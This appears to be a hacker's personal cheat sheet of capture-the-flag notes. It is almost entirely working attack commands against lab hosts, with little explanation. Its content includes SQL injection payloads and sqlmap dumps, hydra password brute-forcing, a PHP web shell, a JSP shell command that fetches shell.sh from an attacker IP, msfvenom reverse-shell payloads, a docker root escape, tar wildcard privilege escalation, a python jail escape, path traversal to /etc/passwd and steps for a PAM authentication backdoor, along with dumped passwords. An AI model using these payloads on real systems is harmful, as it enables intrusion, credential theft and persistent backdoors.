+Logged in as admin,rcLYWHCxeGUsA9tH3GNV:,dev,asd:,amanda,Summer2019!:,maja,345m3io4hj3:,awe32Flage32x,THM{fb381dfee71ef9c31b93625ad540c9fa}:,emil,viking123: | 
+
+---------------------
+
+Blind injection
+
+
+
+-------------------------------------------------------------------------------
+-- Changing start
+SUBSTR("THM{Blind}", 1,1) = T
+SUBSTR("THM{Blind}", 2,1) = H
+SUBSTR("THM{Blind}", 3,1) = M
+
+-- Changing length
+SUBSTR("THM{Blind}", 1,3) = THM
+
+#SUBSTR( string, <start>, <length>)
+
+-------------------------------------------------------------------------------
+
+sqlite> SELECT password FROM users LIMIT 0,1
+THM{Blind}
+sqlite> SELECT password FROM users LIMIT 1,1
+Summer2019!
+sqlite> SELECT password FROM users LIMIT 0,2
+THM{Blind}
+Summer2019!
+
+	
+THM{Blind}
+Summer2019!
+Viking123
+
+LIMIT <OFFSET>, <LIMIT>
+
+-------------------------------------------------------------------------------
+
+admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -
+
+$ sqlmap -u http://10.10.216.72:5000/challenge3/login --data="username=admin&password=admin" 
+--level=5 --risk=3 --dbms=sqlite --technique=b --dump
+
+# password length finding
+
+admin' AND length((SELECT password from users where username='admin'))==37-- -
+
+
+sqlmap --tamper notes.py --url http://10.10.216.72:5000/challenge4/signup  --data "username=admin&password=asd" --second-url http://10.10.216.72:5000/challenge4/notes  -p username --dbms sqlite --technique=U --no-cast
+
+
+
+sqlmap --tamper notes.py --url http://10.10.216.72:5000/challenge4/signup --data "username=admin&password=asd" 
+--second-url http://10.10.216.72:5000/challenge4/notes -p username --dbms=sqlite --technique=U --no-cast -T users --dump
+
+
+
+
+') UNION SELECT 1,2,3,sqlite_version();-- - 
+
+' UNION SELECT '1'' UNION SELECT 1,2,3,sqlite_version();   -- -  #escaping the single quote with single quote 
+																	#two stages injection 
+
+
+' UNION SELECT '1'' UNION SELECT 1,2,3,tbl_name FROM sqlite_master WHERE type="table" and tbl_name NOT like "sqlite_%"   -- -					
+' UNION SELECT '1'' UNION SELECT 1,2,3,tbl_name FROM sqlite_master WHERE type="table" and tbl_name NOT like "sqlite_%"   -- -
+
+
+ ' UNION SELECT '1'' UNION SELECT 1,2,3,group_concat(username || "," || password || ":") from users -- -
+
+------------------------------------------------------------------------
+' UNION SELECT '3' -- - 
+
+Query 1:
+SELECT id FROM books WHERE title like '' UNION SELECT '3' -- - %'
+Query 2:
+SELECT * FROM books WHERE id = '3'
+------------------------------------------------------------------------
+
+
+
+steghide embed -cf regular_image.jpeg -ef super_secret_stuff.txt
+
+steghide — The name of the programembed — This is the command-cf — This flag is for the cover file (file used to embed data)filename — This is the name of the cover file-ef — This flag is for the embed file (file that will be embedded)filename — This is the name of the embedded file
+
+
+steghide extract -sf regular_image.jpeg
+
+
+
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+docker go to market
+
+
+find / -group adm 
+
+
+hydra http-get 
+
+sudo hydra -L wl -P /usr/share/wordlists/rockyou.txt  10.10.34.30 http-get  /inferno -t 64
+
+
+python2 exploit.py http://admin:dante1@10.10.34.30/inferno/ 'admin' 'dante1' 10.9.116.83  9001 linux
+
+mysql -u runcheck -pCTF_script_cave_changeme -h 10.10.13.11
+show DATABASES;
+use runornot
+show tables
+use runcheck
+SELECT * FROM runcheck ;
+'''''
+update runcheck
+    -> set 
+    -> run=1 ;
+''''
+
+
+wget -r  --no-parent http:// .... # get dir 
+
+
+# python echo strings escaping 
+
+\.';;'
+
+
+VIEWING pam version 
+
+
+rpm -qa | grep pam
+ldd /bin/su
+
+pam.so backdoor 
+
+#check the pam version
+rpm -qa | grep pam 
+
+#download the lib
+http://www.linux-pam.org/library/<version>
+
+#modify the pam_unix_auth.c at 
+modules/pam_unix/
+
+#compile 
+make 
+
+#cp pam_unix.so to 
+/lib/x86_64-linux-gnu/security
+
+
+hydra -l doak -P /usr/share/wordlists/rockyou.txt 10.10.115.76 -s 55007 pop3 
+
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null 
+
+
+
+<?php echo shell_exec($_GET['cmd']);?>
+
+subdomain bruteforce
+
+wfuzz -c --hw 977 -u http://wekor.thm -H "Host: FUZZ.wekor.thm" -w /home/dwight/ctf_wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt
+
+
+sqlmap http://[IP]/admin?user=3 --cookie='token=[Enter Cookie] --technique=U --delay=2 -dump
+
+
+
+
+    MS-SQL: user_name()
+    MySQL: user ()
+    ORACLE: select user from dual;
+
+
+
+port 11211 memcache dumping 
+
+/tmp$ /usr/share/memcached/scripts/memcached-tool localhost:11211 dump
+
+			or 
+
+telnet localhost 11211
+
+
+stats items (shows everything in the cache)
+stats cachedump 1 0 (dump everything in the slab id(1))
+get user (user query information in the cache)
+get password (password query information in the cache)
+press Ctrl+] to bring up the telnet prompt
+type close to exit from telnet
+
+
+mosquitto_sub -h 10.10.132.138 -t "#" -p 1883 This listens to all published models except "$SYS"
+mosquitto_sub -h 10.10.132.138 -t "$SYS/#" -p 1883 This listens to "$SYS" published models
+
+
+
+#getting absolute path 
+
+
+/fileserver/test/%20/%20 
+
+test
+
+# PUT
+
+500
+/opt/apache-activemq-5.9.0/webapps/fileserver/test/ / (No such file or directory)
+
+# and then MOVE
+
+500
+file:///opt/apache-activemq-5.9.0/webapps/admin/1.jsp / (No such file or directory)
+
+
+
+using PUT and MOVE 
+
+warning : use browser inspection tab
+
+#curl the shell 
+
+GET /admin/1.jsp?cmd=curl+10.9.116.83%3a8000/shell.sh+-o+sh
+
+
+
+
+sudo nmap -sS -Pn -T4 -p-  10.10.133.123
+
+#dynamic port forwarding 
+
+sudo ssh -i id_rsa -N -D 1337  errorcauser@10.10.133.123
+
+proxychains nmap -sT 127.0.0.1
+
+ssh -i id_rsa -L 8080:127.0.0.1:80 errorcauser@10.10.133.123
+
+
+
+
+after updateing metasploit 
+
+sudo gem install bundler -v 2.2.4
+
+sudo msfdb reinit
+sudo msfconsolef
+
+url encoder ../../../../..//etc/passwd
+%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc%2Fpasswd
+
+# breaking python jail
+
+__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')
+
+%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
+
+
+
+webpage http-get credential store dir 
+
+/etc/apache2/.htpasswd
+
+
+tar and backups
+
+echo "" > --checkpoint=1 
+echo "" > '--checkpoint-action=exec=sh shell.sh'
+touch shell.sh
+--- --------------
+#!/bin/bash
+
+chmod +s /bin/bash
+-----------------
+suid 
+
+/bin/bash -p 
+
+
+gobuster subdomain 
+
+gobuster vhost -w  ~/ctf_wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u http://vulnnet.thm
+
+
+msfvenom .war payload
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.9.116.83 LPORT=1234 -f war -o reverse.war
+
+curl upload 
+
+curl -u webdev --upload-file revshell2.war http://10.10.102.26:8080/manager/text/deploy?path=/
+
+viewing apache tomcat deployed application
+
+10.10.230.186:8080/manager/text/list
+
+/manager/html
+
+port 8009 open tomcat and apache wire vul ghostcat 
+
+exploit/multi/handler 
+gunzip for .gz
+ajpshooter for ghostcat 00theway lfi /WEB-INF/web.xml read
+
+exploit found at sudo -l 
+(root) /usr/bin/java -jar *.jar 
+
+java exploit 
+msfvenom java -p java/meterpreter/reverse_tcp LHOST=10.9.116.83 LPORT=9001 -f jar -o rev.jar 
+handle with meterpreter 
+PAYLOAD /java/meterpreter/reverse_tcp 
